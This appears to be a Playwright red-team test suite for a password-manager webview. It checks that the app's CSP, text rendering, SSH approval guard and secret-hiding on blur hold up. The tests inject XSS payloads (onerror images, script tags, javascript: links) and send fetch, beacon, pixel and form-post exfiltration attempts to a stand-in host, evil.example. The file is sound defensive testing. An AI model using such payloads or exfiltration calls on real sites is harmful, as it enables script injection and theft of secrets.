/**
 * Hostile-page tests (M3 IPC red team): scripts injected into the app page try what XSS in
 * the webview would try. Each test says what it attempts and which defense must hold:
 * the production CSP (served by the mock preview), React's text rendering, the SSH prompt's
 * 1 s allow guard, and hiding a revealed secret on blur.
 */
import { expect, test, type Page } from "@playwright/test";

const EVIL = "https://evil.example";

/** Lets a test move the window focus: `document.hasFocus()` follows `__setFocus`. */
async function controlFocus(page: Page): Promise<void> {
  await page.addInitScript(() => {
    let focused = true;
    Document.prototype.hasFocus = () => focused;
    Object.defineProperty(window, "__setFocus", {
      value: (next: boolean) => {
        focused = next;
        window.dispatchEvent(new Event(next ? "focus" : "blur"));
      },
    });
  });
}

async function setFocus(page: Page, focused: boolean): Promise<void> {
  await page.evaluate((next) => {
    (window as unknown as { __setFocus: (value: boolean) => void }).__setFocus(next);
  }, focused);
}

/**
 * Requests to the attacker's origin that the CSP did not stop. Chromium reports a CSP-blocked
 * subresource as a request that then fails with the reason `csp`; anything else (sent, failed
 * for another reason, answered) counts as escaped.
 */
function evilRequests(page: Page): () => string[] {
  const seen = new Map<string, string>();
  page.on("request", (request) => {
    if (request.url().startsWith(EVIL)) {
      seen.set(request.url(), "sent");
    }
  });
  page.on("requestfailed", (request) => {
    if (request.url().startsWith(EVIL)) {
      seen.set(request.url(), request.failure()?.errorText ?? "failed");
    }
  });
  return () => [...seen].filter(([, outcome]) => outcome !== "csp" && !outcome.includes("ERR_BLOCKED_BY_CSP")).map(([url, outcome]) => `${url}: ${outcome}`);
}

test.use({ locale: "en-US" });

test("CSP: injected scripts, remote loads, frames, base and form posts are refused", async ({ page }) => {
  // Attempt: XSS that injects markup the way a rendered item field or import preview could.
  const exfil = evilRequests(page);
  await page.goto("/?mock=unlocked");
  await expect(page.getByText("GitHub")).toBeVisible();
  const outcome = await page.evaluate(async (evil) => {
    const flags = window as unknown as Record<string, unknown>;
    const directives: string[] = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      directives.push(event.effectiveDirective);
    });
    const add = (element: HTMLElement) => {
      document.body.append(element);
    };

    const inline = document.createElement("script");
    inline.textContent = "window.__pwnedInline = true;";
    add(inline);

    const remote = document.createElement("script");
    remote.src = `${evil}/payload.js`;
    add(remote);

    const handler = document.createElement("img");
    handler.setAttribute("src", "x");
    handler.setAttribute("onerror", "window.__pwnedHandler = true;");
    add(handler);

    const pixel = document.createElement("img");
    pixel.src = `${evil}/pixel.png?leak=1`;
    add(pixel);

    const frame = document.createElement("iframe");
    frame.srcdoc = "<script>parent.__pwnedFrame = true;</scr" + "ipt>";
    add(frame);

    const remoteFrame = document.createElement("iframe");
    remoteFrame.src = `${evil}/frame.html`;
    add(remoteFrame);

    const base = document.createElement("base");
    base.href = `${evil}/`;
    document.head.append(base);

    let fetched = "refused";
    try {
      await fetch(`${evil}/exfil`, { method: "POST", body: "secret" });
      fetched = "sent";
    } catch {
      // Refused by connect-src.
    }

    let beacon = "refused";
    try {
      beacon = navigator.sendBeacon(`${evil}/beacon`, "secret") ? "queued" : "refused";
    } catch {
      // Refused by connect-src.
    }

    const form = document.createElement("form");
    form.action = `${evil}/post`;
    form.method = "post";
    add(form);
    form.submit();

    await new Promise((resolve) => setTimeout(resolve, 750));
    return {
      inline: flags["__pwnedInline"] === true,
      handler: flags["__pwnedHandler"] === true,
      frame: flags["__pwnedFrame"] === true,
      fetched,
      beacon,
      baseHref: document.baseURI,
      directives,
    };
  }, EVIL);

  expect(outcome.inline, "inline <script>").toBe(false);
  expect(outcome.handler, "inline event handler").toBe(false);
  expect(outcome.frame, "srcdoc frame script").toBe(false);
  expect(outcome.fetched).toBe("refused");
  // sendBeacon may report "queued"; connect-src drops it before the network (see `exfil`).
  expect(outcome.baseHref.startsWith(EVIL), "base-uri").toBe(false);
  expect(new Set(outcome.directives)).toEqual(
    new Set(["script-src-elem", "script-src-attr", "img-src", "frame-src", "connect-src", "base-uri", "form-action"]),
  );
  // Still the app, not the attacker's form target (the refused post leaves a navigation that
  // never finishes, so read the document directly instead of through a locator).
  expect(new URL(page.url()).origin).toBe("http://localhost:1421");
  expect(await page.evaluate(() => document.body.textContent.includes("GitHub"))).toBe(true);
  expect(exfil()).toEqual([]);
});

test("user text with markup and bidi controls renders as text", async ({ page }) => {
  // Attempt: a vault name or search text (typed, imported or synced) that carries HTML or
  // script. The mock has no add_item, so the vault name and the palette query stand in for
  // item fields; they go through the same React text rendering.
  const exfil = evilRequests(page);
  const name = `<img src=x onerror="window.__pwned=1">Ops\u202Etxt.exe`;
  const query = `<script>window.__pwned=2</script><a href="javascript:window.__pwned=3">x</a>`;
  await page.goto("/?mock=unlocked");
  await expect(page.getByText("GitHub")).toBeVisible();
  await page.getByRole("button", { name: "New vault" }).click();
  await page.getByLabel("Vault name").fill(name);
  await page.getByRole("button", { name: "Create vault" }).click();
  await expect(page.getByText(name).first()).toBeVisible();
  await page.keyboard.press("Control+k");
  await page.getByRole("combobox", { name: "Search items and commands" }).fill(query);
  await expect(page.getByText("Nothing matches. Try another word.")).toBeVisible();
  const dom = await page.evaluate(() => ({
    pwned: (window as unknown as Record<string, unknown>)["__pwned"] ?? null,
    images: document.querySelectorAll('img[src="x"]').length,
    scripts: [...document.querySelectorAll("script")].filter((s) => s.textContent.includes("__pwned")).length,
    links: document.querySelectorAll('a[href^="javascript:"]').length,
    handlers: document.querySelectorAll("[onerror], [onmouseover]").length,
  }));
  expect(dom).toEqual({ pwned: null, images: 0, scripts: 0, links: 0, handlers: 0 });
  expect(exfil()).toEqual([]);
});

test("SSH approval: scripted clicks during the guard approve nothing, and a refocus restarts it", async ({
  page,
}) => {
  // Attempt: a click (or a click the page fakes) that lands on Allow as the prompt opens or
  // the window comes back to the front.
  await controlFocus(page);
  await page.goto("/?mock=unlocked&sshRequest=1");
  const deny = page.getByRole("button", { name: "Deny" });
  const allow = page.getByRole("button", { name: "Allow once" });
  await expect(deny).toBeVisible({ timeout: 5000 });
  await expect(allow).toBeDisabled();

  const scriptedClicks = async () => {
    await page.evaluate(() => {
      for (const button of document.querySelectorAll("button")) {
        if (button.textContent.includes("Allow")) {
          button.click();
          button.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
          button.dispatchEvent(new PointerEvent("pointerup", { bubbles: true }));
        }
      }
    });
  };
  await scriptedClicks();
  await expect(deny, "the prompt survives scripted clicks").toBeVisible();

  await expect(allow).toBeEnabled({ timeout: 3000 });
  await setFocus(page, false);
  await expect(allow, "no allow while the window is in the background").toBeDisabled();
  await setFocus(page, true);
  await expect(allow, "the guard restarts on refocus").toBeDisabled();
  await scriptedClicks();
  await expect(deny).toBeVisible();
  await expect(allow).toBeEnabled({ timeout: 3000 });

  await deny.click();
  await expect(deny).toBeHidden();
});

test("a reveal that answers after the window lost focus stays hidden", async ({ page }) => {
  // Attempt: the window goes to the background (screen share, another app in front) while a
  // reveal is still on its way; the late answer must not paint the secret.
  await controlFocus(page);
  await page.goto("/?mock=unlocked&latency=600");
  await page.getByRole("button", { name: /GitHub/ }).click();
  await expect(page.getByRole("article", { name: "GitHub" })).toBeVisible();
  await page.getByRole("button", { name: "Reveal Password" }).click();
  await setFocus(page, false);
  // Longer than the mock latency: the answer has arrived.
  await page.waitForTimeout(1200);
  await expect(page.getByText("correct-horse-battery-staple")).toHaveCount(0);
  await setFocus(page, true);
  await expect(page.getByText("correct-horse-battery-staple")).toHaveCount(0);
  // A reveal while focused still works.
  await page.getByRole("button", { name: "Reveal Password" }).click();
  await expect(page.getByText("correct-horse-battery-staple")).toBeVisible();
});

test("item URLs are text, never links the webview could follow", async ({ page }) => {
  // Attempt: an item URL (typed, imported or synced; it may be `javascript:`, `file:`, a UNC
  // path or an OS scheme) becomes a link, so a click navigates the vault window or hands the
  // URL to the OS (ADR-0026 item 5: the webview opens no external link). The mock has fixed
  // items, so their https URLs stand in; Rust's navigation guard (`navigation.rs`) is the
  // backstop, which this Chromium run against the mock IPC cannot exercise.
  const exfil = evilRequests(page);
  await page.goto("/?mock=unlocked");
  await page.getByRole("button", { name: /GitHub/ }).click();
  const detail = page.getByRole("article", { name: "GitHub" });
  await expect(detail.getByText("https://github.com/login")).toBeVisible();
  await detail.getByText("https://github.com/login").click({ modifiers: ["Control"] });
  await detail.getByText("https://github.com/login").dblclick();
  const detailLinks = await linkTargets(page);
  await page.getByRole("button", { name: "Security" }).click();
  await expect(page.getByRole("heading", { name: "Security" })).toBeVisible();
  expect({ detail: detailLinks, security: await linkTargets(page) }).toEqual({ detail: [], security: [] });
  expect(page.context().pages()).toHaveLength(1);
  expect(new URL(page.url()).origin).toBe("http://localhost:1421");
  expect(exfil()).toEqual([]);
});

/** Every link, area or form target in the document except in-page fragments. */
async function linkTargets(page: Page): Promise<string[]> {
  return page.evaluate(() =>
    [...document.querySelectorAll("a[href], area[href], [formaction], form[action]")]
      .map((element) => element.getAttribute("href") ?? element.getAttribute("formaction") ?? element.getAttribute("action") ?? "")
      .filter((target) => !target.startsWith("#")),
  );
}
